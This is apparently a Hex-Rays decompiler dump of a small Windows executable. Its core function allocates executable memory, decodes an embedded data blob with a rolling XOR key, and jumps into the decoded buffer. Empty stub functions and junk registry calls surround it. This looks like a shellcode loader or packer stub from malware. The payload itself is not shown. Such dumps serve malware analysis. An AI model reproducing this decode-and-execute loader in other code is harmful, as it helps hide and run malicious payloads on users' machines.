/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// LSTATUS __stdcall SHRegQueryInfoUSKeyA(HUSKEY hUSKey, LPDWORD pcSubKeys, LPDWORD pcchMaxSubKeyLen, LPDWORD pcValues, LPDWORD pcchMaxValueNameLen, SHREGENUM_FLAGS enumRegFlags);
// DWORD __stdcall GetLastError();
// LPVOID __stdcall VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
DWORD sub_401788();
// int __usercall sub_4017A0@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>);
void sub_401830();
void __stdcall sub_401840(int a1, int a2, int a3);
void sub_401870();
void sub_401880();
void sub_401890();
void sub_4018A0();
void sub_4018B0();
void sub_4018C0();
void sub_4018D0();
void sub_4018E0();
void sub_4018F0();
void sub_401900();
void sub_401910();
void sub_401920();
int start();

//-------------------------------------------------------------------------
// Data declarations

char byte_401749[3] = { ',', 'p', '$' }; // weak
_UNKNOWN unk_404796; // weak
_UNKNOWN unk_405972; // weak


//----- (00401788) --------------------------------------------------------
DWORD sub_401788()
{
  return GetLastError();
}

//----- (004017A0) --------------------------------------------------------
int __usercall sub_4017A0@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  LSTATUS v3; // eax
  int v4; // edx
  int v5; // ecx
  _DWORD *v6; // eax
  int *v7; // ecx
  int v8; // edx
  LSTATUS v10; // [esp-20h] [ebp-260h]
  int v11; // [esp-1Ch] [ebp-25Ch]
  int v12; // [esp-18h] [ebp-258h]
  int v13; // [esp+0h] [ebp-240h] BYREF
  int v14; // [esp+F0h] [ebp-150h]
  int *v15; // [esp+1F0h] [ebp-50h]
  int savedregs; // [esp+240h] [ebp+0h] BYREF

  v3 = SHRegQueryInfoUSKeyA(0, 0, 0, 0, 0, SHREGENUM_DEFAULT);
  v12 = v5;
  v11 = v4;
  v10 = v3;
  v15 = (int *)VirtualAllocEx((HANDLE)0xFFFFFFFF, 0, 0x2000u, 0x1000u, 0x40u);
  v6 = &unk_404796;
  v7 = v15;
  v14 = 1120526796;
  do
  {
    v8 = v14 ^ (-*v6 - 571078274);
    v14 += 571078273;
    *v7 = v8;
    ++v6;
    ++v7;
  }
  while ( v6 != (_DWORD *)&unk_405972 );
  return ((int (__thiscall *)(int *, LSTATUS, int, int, int, int *, int *, int, int))v15)(
           v7,
           v10,
           v11,
           v12,
           a1,
           &v13,
           &savedregs,
           a2,
           a3);
}
// 4017BD: variable 'v5' is possibly undefined
// 4017BD: variable 'v4' is possibly undefined

//----- (00401830) --------------------------------------------------------
void sub_401830()
{
  ;
}

//----- (00401840) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __stdcall sub_401840(int a1, int a2, int a3)
{
  char *v3; // kr00_4

  v3 = &byte_401749[SHRegQueryInfoUSKeyA(0, 0, 0, 0, 0, SHREGENUM_DEFAULT)];
  __asm { retn    0Ch }
}
// 401863: positive sp value 4 has been found

//----- (00401870) --------------------------------------------------------
void sub_401870()
{
  ;
}

//----- (00401880) --------------------------------------------------------
void sub_401880()
{
  ;
}

//----- (00401890) --------------------------------------------------------
void sub_401890()
{
  ;
}

//----- (004018A0) --------------------------------------------------------
void sub_4018A0()
{
  ;
}

//----- (004018B0) --------------------------------------------------------
void sub_4018B0()
{
  ;
}

//----- (004018C0) --------------------------------------------------------
void sub_4018C0()
{
  ;
}

//----- (004018D0) --------------------------------------------------------
void sub_4018D0()
{
  ;
}

//----- (004018E0) --------------------------------------------------------
void sub_4018E0()
{
  ;
}

//----- (004018F0) --------------------------------------------------------
void sub_4018F0()
{
  ;
}

//----- (00401900) --------------------------------------------------------
void sub_401900()
{
  ;
}

//----- (00401910) --------------------------------------------------------
void sub_401910()
{
  ;
}

//----- (00401920) --------------------------------------------------------
void sub_401920()
{
  ;
}

//----- (00401930) --------------------------------------------------------
int start()
{
  LSTATUS v0; // eax

  v0 = SHRegQueryInfoUSKeyA(0, 0, 0, 0, 0, SHREGENUM_DEFAULT);
  return ((int (*)(void))&byte_401749[v0])();
}
// 401930: could not find valid save-restore pair for ebp

// nfuncs=17 queued=17 decompiled=17 lumina nreq=0 worse=0 better=0
// ALL OK, 17 function(s) have been successfully decompiled
